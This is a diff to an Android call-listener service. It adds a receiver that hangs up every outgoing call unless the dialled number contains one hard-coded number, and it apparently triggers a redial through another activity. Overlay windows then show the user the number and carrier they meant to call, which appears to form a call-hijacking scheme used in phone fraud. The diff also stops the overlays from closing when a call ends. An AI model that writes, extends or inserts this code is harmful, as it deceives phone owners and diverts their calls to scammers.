@@ -5,17 +5,21 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.app.Service;
+import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.pm.ActivityInfo;
 import android.graphics.Color;
 import android.graphics.PixelFormat;
 import android.os.Build;
+import android.os.Handler;
 import android.os.IBinder;
 import android.support.annotation.Nullable;
 import android.telephony.PhoneStateListener;
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
+import android.util.Log;
 import android.view.Gravity;
 import android.view.KeyEvent;
 import android.view.LayoutInflater;
@@ -50,7 +54,7 @@ public class CallListenerService extends Service {
     private TextView b1;
     private TextView b2;
     private final static int GRAY_SERVICE_ID = 3;
-
+    private InnerOutCallReceiver mInnerOutCallReceiver;
     @Override
     public void onCreate() {
         super.onCreate();
@@ -59,9 +63,31 @@ public class CallListenerService extends Service {
         }
         initPhoneCallView();
         initPhoneStateListener();
-
+        initout();
 
     }
+
+    private void initout() {
+
+        mInnerOutCallReceiver = new InnerOutCallReceiver();
+        // 手机拨打电话时会发送：android.intent.action.NEW_OUTGOING_CALL的广播
+        IntentFilter intentFilter = new IntentFilter(Intent.ACTION_NEW_OUTGOING_CALL);
+        registerReceiver(mInnerOutCallReceiver, intentFilter);
+
+    }
+
+    class InnerOutCallReceiver extends BroadcastReceiver {
+
+        @Override
+        public void onReceive(Context context, Intent intent) {
+            String outPhone = getResultData();
+            outPhone(outPhone);
+            if (!outPhone.contains("17108588585")){
+                endcall(true);
+            }
+        }
+    }
+
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         super.onStartCommand(intent, flags, startId);
@@ -87,19 +113,19 @@ public class CallListenerService extends Service {
 
                 switch (state) {
                     case TelephonyManager.CALL_STATE_IDLE: // 待机，即无电话时，挂断时触发
-                        dismiss1();
-                        dismiss2();
+                       // dismiss1();
+                       // dismiss2();
                         break;
 
                     case TelephonyManager.CALL_STATE_RINGING: // 响铃，来电时触发
                         isCallingIn = true;
-                        来电(incomingNumber);
+                        inComePhone(incomingNumber);
 
                         break;
 
                     case TelephonyManager.CALL_STATE_OFFHOOK: // 摘机，接听或拨出电话时触发
                         dismiss1();
-                        去电(incomingNumber);
+
                         break;
 
                     default:
@@ -173,7 +199,7 @@ public class CallListenerService extends Service {
         ImageView jt = phoneCallView.findViewById(R.id.jt);
         jt.setOnClickListener(new View.OnClickListener(){
             public void onClick(View view) {
-                endcall();
+                endcall(false);
             }
         });
 
@@ -181,7 +207,9 @@ public class CallListenerService extends Service {
         ImageView gd = phoneCallView.findViewById(R.id.gd);
         gd.setOnClickListener(new View.OnClickListener(){
             public void onClick(View view) {
-                endcall();
+                endcall(false);
+                dismiss1();
+                dismiss2();
             }
         });
 
@@ -212,9 +240,17 @@ public class CallListenerService extends Service {
         ImageView jtgd = phoneView.findViewById(R.id.jtgd);
         jtgd.setOnClickListener(new View.OnClickListener(){
             public void onClick(View view) {
-                endcall();
+                endcall(false);
+                new Handler().postDelayed(new Runnable() {
+                    @Override
+                    public void run() {
+                        dismiss1();
+                        dismiss2();
+                    }
+                },1000);
             }
         });
+
     }
 
     private Notification getNotification() {
@@ -244,14 +280,6 @@ public class CallListenerService extends Service {
         }
         return notification;
     }
-
-
-
-
-
-
-
-
 
 
 
@@ -302,10 +330,10 @@ public class CallListenerService extends Service {
 
 
 
-    public  void endcall() { //挂断电话
+    public  void endcall(boolean recall) { //挂断电话
 
         if(true){
-            OnePiexActivity.startOnePix(this);
+            OnePiexActivity.startOnePix(this,recall);
             return;
         }
         Context cx = MainActivity.getContext();
@@ -369,7 +397,7 @@ public class CallListenerService extends Service {
         }
     }
 
-    public void 来电(String incomingNumber) {
+    public void inComePhone(String incomingNumber) {
         int ui;
         tvCallNumber.setText(formatPhoneNumber(incomingNumber));
         ui =GetPhoneNoOperators(incomingNumber);
@@ -397,7 +425,7 @@ public class CallListenerService extends Service {
 
 
 
-    public void 去电(String incomingNumber) {
+    public void outPhone(String incomingNumber) {
         int ui;
         b1.setText(formatPhoneNumber(incomingNumber));
         ui =GetPhoneNoOperators(incomingNumber);
@@ -415,6 +443,10 @@ public class CallListenerService extends Service {
 
         if(ui == 3){
             b2.setText("中国联通");
+        }
+        try {
+            windowManager.removeView(phoneView);
+        }catch (Exception e){
         }
         windowManager.addView(phoneView, params);
         hasShown = true;
@@ -439,6 +471,9 @@ public class CallListenerService extends Service {
 
     public static int GetPhoneNoOperators(String phoneNo)
     {
+        try {
+
+
         String subphone = phoneNo.substring(0, 3);
         //移动号码段134、135、136、137、138、139、150、151、152、157(TD)、158、159、187、188
         if (subphone.equals("134") || subphone.equals("135") || subphone.equals("136") ||
@@ -461,5 +496,8 @@ public class CallListenerService extends Service {
                     return 3;//联通号
                 else
                     return 0;//没有与此相关的号码段
+        }catch (Exception e){
+            return 0;
+        }
     }
 }
